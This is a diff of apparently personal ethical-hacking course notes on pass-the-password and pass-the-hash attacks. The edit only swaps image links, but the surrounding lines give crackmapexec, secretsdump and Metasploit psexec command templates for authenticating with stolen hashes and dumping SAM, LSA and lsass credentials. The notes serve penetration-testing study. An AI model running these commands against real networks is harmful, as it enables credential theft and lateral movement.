@@ -8,25 +8,25 @@ This attack can be conducted in a variety of ways, make sure all machines are tu
 
 - **Pass the Password.** `crackmapexec smb <IP/CIDR> -u <user> -d <domain> -p <pass>`.
 
-![passthepassword1.png](I%20Pass%20Attacks%20Overview%20aef10fbe72ca49f0838065b55cb1892f/passthepassword1.png)
+![passthepassword1](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/914fecbc-c4cf-475e-b15e-1529bd3a3d0b)
 
 - **Grab the Local Hashes with Metasploit.** `windows/smb/psexec` **OR using secretsdump.py.** `secretsdump.py <DOMAIN>/<user>:<pass>@DOMAIN IP`
 
 **Pass the Hash.** `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth`
 
-![passthehash1.png](I%20Pass%20Attacks%20Overview%20aef10fbe72ca49f0838065b55cb1892f/passthehash1.png)
+![passthehash1](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/4c5ca120-8722-4ec0-abab-3d4df69b2d10)
 
 - **Dump valuable data** `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --sam`.
 
-![passthehash2.png](I%20Pass%20Attacks%20Overview%20aef10fbe72ca49f0838065b55cb1892f/passthehash2.png)
+![passthehash2](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/835e9fa7-8e40-47e5-83c0-854e77bda835)
 
 - E**numerate shares** `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --shares`.
 
-![passthehash3.png](I%20Pass%20Attacks%20Overview%20aef10fbe72ca49f0838065b55cb1892f/passthehash3.png)
+![passthehash3](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/550ed0a8-9828-48fe-83b9-fce83f052007)
 
 - **Dump LSA (Local Security Authority).** `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --lsa`.
 
-![passthehash4.png](I%20Pass%20Attacks%20Overview%20aef10fbe72ca49f0838065b55cb1892f/passthehash4.png)
+![passthehash4](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/42b51df5-6b49-434f-b1be-b022b741deb8)
 
 - **Check for different modules.** `crackmapexec smb -L`.
 - **Dump lsass to get credentials in real-time.** `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth -M lsassy`.
